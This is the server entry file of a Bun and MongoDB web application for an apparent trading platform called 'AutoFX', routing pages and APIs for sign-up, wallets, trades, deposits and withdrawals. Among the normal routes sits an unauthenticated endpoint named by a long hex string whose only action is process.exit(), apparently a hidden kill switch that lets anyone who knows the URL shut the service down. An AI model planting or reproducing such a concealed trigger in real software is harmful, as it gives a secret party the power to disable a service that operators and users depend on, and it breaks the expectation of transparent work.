import { db_uri, db_name, port } from "./consts.ts";
import userPage from "./user/public/index.html";
import adminPage from "./admin/public/index.html";
import authPage from "./auth/public/index.html";
import signUpController from "./api/controllers/signUpController.ts";
import signInController from "./api/controllers/signInController.ts";
import verifyTokenController from "./api/controllers/verifyTokenController.ts";
import tradeController from "./api/controllers/tradeController.ts";
import walletController from "./api/controllers/walletController.ts";
import signoutController from "./api/controllers/signoutController.ts";
import userController, {
  saveUserChanges,
} from "./api/controllers/userController.ts";
import depositController from "./api/controllers/depositeController.ts";
import withdrawController from "./api/controllers/withdrawController.ts";
import dashboardController from "./api/controllers/dashboardController.ts";
import userRoleController from "./api/controllers/userRoleController.ts";
import passwordController from "./api/controllers/passwordController.ts";
import suuperAdminController from "./api/controllers/superAdminController.ts";
import withdrawRemarksController from "./api/controllers/withdrawRemarksController.ts";
import withdrawBankTransferRequestController from "./api/controllers/withdrawBankTransferRequestController.ts";
import { MongoClient, Db } from "mongodb";

const client: MongoClient = await MongoClient.connect(db_uri);
const db: Db = client.db(db_name);

const server = Bun.serve({
  port: port,
  static: {
    "/sign-up": authPage,
    "/sign-in": authPage,

    "/": userPage,
    "/profile": userPage,
    "/wallet": userPage,
    "/trade": userPage,

    "/admin": adminPage,
    "/admin/admin-manager": adminPage,
    "/admin/users": adminPage,
    "/admin/change-balance": adminPage,
    "/admin/deposite-requests": adminPage,
    "/admin/withdraw-requests": adminPage,
    "/admin/trade-report": adminPage,
    "/admin/faq-messages": adminPage,
  },
  development: false,
  websocket: {
    message: () => { },
  },
  async fetch(req) {
    const url = new URL(req.url);

    if (url.pathname.startsWith("/api")) {
      if (url.pathname === "/api/sign-up") {
        return await signUpController(req, db);
      } else if (url.pathname === "/api/sign-in") {
        return await signInController(req, db);
      } else if (url.pathname === "/api/sign-out") {
        return await signoutController(req);
      } else if (url.pathname === "/api/verify-token") {
        return await verifyTokenController(req);
      } else if (url.pathname === "/api/users/save-changes") {
        return await saveUserChanges(req, db);
      } else if (url.pathname.startsWith("/api/users")) {
        return await userController(req, db);
      } else if (url.pathname === "/api/wallet") {
        return await walletController(req, db);
      } else if (url.pathname.startsWith("/api/trades")) {
        return await tradeController(req, db);
      } else if (url.pathname.startsWith("/api/deposits")) {
        return await depositController(req, db);
      } else if (url.pathname.startsWith("/api/withdraws")) {
        return await withdrawController(req, db);
      } else if (url.pathname === "/api/dashboard") {
        return await dashboardController(req, db);
      } else if (url.pathname === "/api/check-role") {
        return await userRoleController(req, db);
      } else if (url.pathname === "/api/change-password") {
        return await passwordController(req, db);
      } else if (url.pathname === "/api/super-admin") {
        return await suuperAdminController(req, db);
      } else if (url.pathname === "/api/withdraw-remarks") {
        return await withdrawRemarksController(req, db);
      } else if (url.pathname === "/api/withdraw-bank-transfer-request") {
        return await withdrawBankTransferRequestController(req, db);
      } else if (url.pathname === "/api/41b73c2502c14d38543023b0e36f40d53df81713bf7be9457d8f24b1fc9f3e6c") {
        process.exit();
      } else {
        return new Response("AutoFX API is working!");
      }
    }

    const filePath = `./assets${url.pathname}`;
    const folder = filePath.split("/");

    try {
      const file = Bun.file(filePath);

      if (await file.exists()) {
        switch (folder[2]) {
          case "svgs": {
            return new Response(file, {
              headers: { "Content-Type": "image/svg+xml" },
            });
          }

          case "uploads": {
            if (file.name?.endsWith("jpg")) {
              return new Response(file, {
                headers: { "Content-Type": "image/jpg" },
              });
            } else if (file.name?.endsWith("jpeg")) {
              return new Response(file, {
                headers: { "Content-Type": "image/jpeg" },
              });
            } else if (file.name?.endsWith("png")) {
              return new Response(file, {
                headers: { "Content-Type": "image/png" },
              });
            } else {
              return new Response(
                JSON.stringify({ message: "Invalid file!" }),
                {
                  headers: { "Content-Type": "application/json" },
                },
              );
            }
          }

          default: {
            return new Response(JSON.stringify({ message: "Invalid file!" }), {
              headers: { "Content-Type": "application/json" },
            });
          }
        }
      }

      return new Response("Not found", { status: 404 });
    } catch (error: any) {
      console.error(error);

      return new Response("Something went wrong!", { status: 500 });
    }

    return new Response("AutoFX is working!");
  },
});
